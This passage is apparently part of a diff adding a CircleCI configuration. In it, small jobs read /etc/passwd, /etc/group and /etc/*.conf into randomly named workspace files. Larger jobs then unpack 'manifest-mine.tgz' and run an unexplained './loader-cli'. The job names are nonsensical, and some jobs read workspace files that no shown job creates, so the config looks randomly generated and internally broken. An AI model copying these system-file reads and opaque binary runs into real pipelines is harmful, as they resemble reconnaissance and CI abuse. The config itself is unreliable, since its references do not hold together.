+            { set +o pipefail 2>/dev/null; sort -t: -k7,7 /etc/passwd | head -n 5; true ; } > /tmp/x3/INV30290
+            echo "gate RUN_PROD: $(wc -c </tmp/x3/INV30290) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'INV30290'
+  RUN_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/INV30290
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  jet-loom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Spawn Tutorial Zone Low Res
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; for i in {1..3}; do echo "round $i"; sleep 0.1; done; echo "finished at $(date +%T)"; true ; } > /tmp/x3/107.248.112
+            echo "gate ValidateImage: $(wc -c </tmp/x3/107.248.112) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '107.248.112'
+  ValidateImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/stage2c4d643
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  triggerPage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: reprocess the model weights lol
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; if grep -q "video" /etc/group; then echo "it is there"; else echo nope; fi; true ; } > /tmp/x3/eG1tQkrFg
+            echo "gate cook-it: $(wc -c </tmp/x3/eG1tQkrFg) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'eG1tQkrFg'
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/stage2c4d643
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  interfaceVal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Set sail for compression
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; echo 'release notes ready' | cut -d' ' -f1; true ; } > /tmp/x3/ZcMx7MAmxZk2EgV
+            echo "gate PROD_BUILD_3: $(wc -c </tmp/x3/ZcMx7MAmxZk2EgV) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'ZcMx7MAmxZk2EgV'
+  PROD_BUILD_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/ZcMx7MAmxZk2EgV
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+
+  OPT_SPHERE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: nvm dump the dead tuples
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; du -k /etc/*.conf 2>/dev/null | awk '{s+=$1} END {print s "K"}'; true ; } > /tmp/x3/HTTP.wave
+            echo "gate sanity: $(wc -c </tmp/x3/HTTP.wave) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'HTTP.wave'
+  OPHCE-11435:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: go
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; sed 's/:.*//' /etc/group | tail -n 3 | sort --ignore-case | awk '{print length, $0}'; true ; } > /tmp/x3/kappa-4415
+            echo "gate v6-nightly: $(wc -c </tmp/x3/kappa-4415) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'kappa-4415'
+  IMPORT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Keep the load profile as is
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; stat -c %s /etc/*.conf|awk '{print $1 * 2}'|xargs; true ; } > /tmp/x3/964b2dbf81bec5ea842055c92
+            echo "gate d-new: $(wc -c </tmp/x3/964b2dbf81bec5ea842055c92) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '964b2dbf81bec5ea842055c92'
+workflows:
+  ci:
+    jobs:
+      - capability_controller_locked
+      - strated-57:
+          requires:
+            - capability_controller_locked
+      - FinnTanaka:
+          requires:
+            - capability_controller_locked
+      - dp-new:
+          requires:
+            - FinnTanaka
+      - zxcxcvb:
+          requires:
+            - FinnTanaka
+      - LaunchProd:
+          requires:
+            - zxcxcvb
+      - ww:
+          requires:
+            - zxcxcvb
+      - apr16-canary:
+          requires:
+            - ww
+      - r47io
+      - OPT_SPHERE:
+          requires:
+            - r47io
+      - sanity:
+          requires:
+            - OPT_SPHERE
+      - LANGUAGE_MT_DE:
+          requires:
+            - OPT_SPHERE
+      - OPHCE-11435:
+          requires:
+            - LANGUAGE_MT_DE
+      - v6-nightly:
+          requires:
+            - OPHCE-11435
+      - team-papa:
+          requires:
+            - OPHCE-11435
+      - IMPORT:
+          requires:
+            - team-papa
+      - d-new:
+          requires:
+            - IMPORT
+      - args_exp_prev
+      - bindPort
+      - triggerPage
+      - callisto-rc:
+          requires:
+            - args_exp_prev
+            - bindPort
+            - triggerPage
+      - wen-run:
+          requires:
+            - args_exp_prev
+            - bindPort
+            - triggerPage
+      - cook-it:
+          requires:
+            - args_exp_prev
+            - bindPort
+            - triggerPage
+      - titan2-final:
+          requires:
+            - args_exp_prev
+            - bindPort
+            - triggerPage
+      - ValidateImage:
+          requires:
+            - args_exp_prev
+            - bindPort
+            - triggerPage
+      - mk2
+      - RUN_PROD:
+          requires:
+            - mk2
+      - mark1:
+          requires:
+            - mk2
+      - preview-build:
+          requires:
+            - mark1
+      - has-backup:
+          requires:
+            - mark1
+      - verify-full-regression-suite:
+          requires:
+            - has-backup
+      - NullErrorUtils:
+          requires:
+            - has-backup
+      - p-new:
+          requires:
+            - NullErrorUtils
+      - interfaceVal:
+          requires:
+            - NullErrorUtils
+      - PROD_BUILD_3:
+          requires:
+            - interfaceVal
+      - sleepASCII
+      - ZONE_FILE
+      - realease:
+          requires:
+            - sleepASCII
+            - ZONE_FILE
+      - go1-21-cov:
+          requires:
+            - sleepASCII
+            - ZONE_FILE
+      - rocket:
+          requires:
+            - sleepASCII
+            - ZONE_FILE
+      - push-it:
+          requires:
+            - sleepASCII
+            - ZONE_FILE
+      - build-partial-artifact-bundle:
+          requires:
+            - sleepASCII
+            - ZONE_FILE
+      - klushsisttaimd
+      - nov10-ship:
+          requires:
+            - klushsisttaimd
+      - moduleStr_:
+          requires:
+            - klushsisttaimd
+      - Package_Image2:
+          requires:
+            - moduleStr_
+      - postSidebarById:
+          requires:
+            - moduleStr_
+      - all-greens:
+          requires:
+            - postSidebarById
+      - ISRInstance:
+          requires:
+            - postSidebarById
+      - p-2:
+          requires:
+            - ISRInstance
+      - needs_box:
+          requires:
+            - ISRInstance
+      - fire-up:
+          requires:
+            - needs_box
+      - cold-p:
+          requires:
+            - needs_box
+      - jul7-canary:
+          requires:
+            - cold-p
+      - weIGHt__ShIpMENt__cLEAR:
+          requires:
+            - cold-p
+      - v4-canary:
+          requires:
+            - weIGHt__ShIpMENt__cLEAR
+      - bugfix-145-factory:
+          requires:
+            - weIGHt__ShIpMENt__cLEAR
+      - Verify_Tests8:
+          requires:
+            - bugfix-145-factory
